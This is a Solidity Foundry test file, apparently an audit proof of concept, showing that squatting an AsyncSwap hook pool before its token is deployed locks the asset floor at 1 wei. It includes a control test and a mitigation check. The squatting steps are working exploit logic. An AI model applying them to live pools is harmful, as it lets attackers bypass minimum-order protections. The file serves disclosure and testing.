// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {SetupHook} from "../../SetupHook.t.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";
import {MockERC20} from "../../utils/MockERC20.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {PoolId} from "v4-core/types/PoolId.sol";
import {PoolIdLibrary, PoolKey} from "v4-core/types/PoolKey.sol";

/// @notice Candidate 3: `_minAssetAmount` staticcalls `decimals()`; on an address with no code the call succeeds with
///         empty data -> `ret.length < 32` -> floor 1. A squatter who initializes the pool before the token is
///         deployed fixes the asset floor at 1 wei for that PoolKey forever.
contract PoolSquatAssetFloorPoc is SetupHook {
    using PoolIdLibrary for PoolKey;

    address tokenDeployer = makeAddr("tokenDeployer");
    address squatter = makeAddr("squatter");
    address alice = makeAddr("alice");

    function setUp() public override {
        hookAssetPrecision = 4; // production: floor 1e14 for an 18-decimal asset
        hookMinOrderUsd = 10; // production default
        super.setUp();
    }

    function _keyFor(address asset, int24 spacing) internal view returns (PoolKey memory k) {
        (address c0, address c1) = asset < address(token1) ? (asset, address(token1)) : (address(token1), asset);
        k = PoolKey(Currency.wrap(c0), Currency.wrap(c1), LPFeeLibrary.DYNAMIC_FEE_FLAG, spacing, hook);
    }

    /// @dev Sell `amountIn` of `asset` on pool `k` for at least `amountOutMin` numeraire. Returns the stored input.
    function _sell(PoolKey memory k, address asset, uint256 amountIn, uint256 amountOutMin) internal returns (uint256) {
        bool zeroForOne = Currency.unwrap(k.currency0) == asset;
        AsyncOrder memory o = AsyncOrder({
            key: k,
            owner: alice,
            zeroForOne: zeroForOne,
            amountIn: amountIn,
            amountOutMin: amountOutMin,
            priorityFee: 0,
            sqrtPrice: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1,
            salt: keccak256(
                abi.encode(block.timestamp, block.number, address(manager), alice, amountIn, amountOutMin, 0)
            )
        });
        vm.startPrank(alice);
        hook.setExecutor(k.toId(), address(router), true);
        MockERC20(asset).approve(address(router), type(uint256).max);
        router.swap(o, abi.encode(AsyncSwap.UserParams(alice, address(router), amountOutMin, 0)));
        vm.stopPrank();
        bytes32 id = keccak256(abi.encode(block.chainid, k.toId(), alice, zeroForOne, o.salt));
        return hook.asyncOrder(k.toId(), id);
    }

    function sellExternal(PoolKey memory k, address asset, uint256 amountIn, uint256 amountOutMin) external {
        _sell(k, asset, amountIn, amountOutMin);
    }

    function test_poc_squattedPoolHasOneWeiFloor() public {
        address predicted = vm.computeCreateAddress(tokenDeployer, vm.getNonce(tokenDeployer));
        assertEq(predicted.code.length, 0);
        PoolKey memory squat = _keyFor(predicted, 1);

        // Squatter opens the canonical pool before the token exists, at an arbitrary extreme price.
        vm.prank(squatter);
        manager.initialize(squat, TickMath.MAX_SQRT_PRICE - 1);
        emit log_named_uint("squatted pool asset floor", hook.minAssetAmount(squat.toId()));
        assertEq(hook.minAssetAmount(squat.toId()), 1, "floor fixed at 1 wei");

        // Token launches at the predicted address (18 decimals).
        vm.prank(tokenDeployer);
        MockERC20 asset = new MockERC20("Launch", "LNCH", 18);
        assertEq(address(asset), predicted);
        asset.mint(alice, 1 ether);

        // 1-wei sell (asking the $10 minimum) is accepted on the squatted pool despite precision 4.
        uint256 stored = _sell(squat, address(asset), 1, 10e6);
        emit log_named_uint("1-wei sell stored on squatted pool", stored);
        assertEq(stored, 1);
        assertLt(stored, 1e14 * 80 / 100, "below the intended 1e14 floor");

        // Mitigation available: a fresh key (tickSpacing 2) for the same token gets the proper floor.
        PoolKey memory fresh = _keyFor(address(asset), 2);
        manager.initialize(fresh, 2 ** 96);
        emit log_named_uint("fresh pool (spacing 2) floor", hook.minAssetAmount(fresh.toId()));
        assertEq(hook.minAssetAmount(fresh.toId()), 1e14);
    }

    /// Control: the pool initialized after the token exists has the 1e14 floor and rejects 1-wei sells.
    function test_control_poolAfterDeployHasFloor() public {
        vm.prank(tokenDeployer);
        MockERC20 asset = new MockERC20("Launch", "LNCH", 18);
        asset.mint(alice, 1 ether);
        PoolKey memory k = _keyFor(address(asset), 1);
        manager.initialize(k, 2 ** 96);
        emit log_named_uint("honest pool asset floor", hook.minAssetAmount(k.toId()));
        assertEq(hook.minAssetAmount(k.toId()), 1e14);
        vm.expectRevert(); // BelowMinimumAssetAmount wrapped by PoolManager
        this.sellExternal(k, address(asset), 1, 10e6);
        assertEq(_sell(k, address(asset), 1e14, 10e6), 1e14, "floor-sized sell accepted");
    }
}
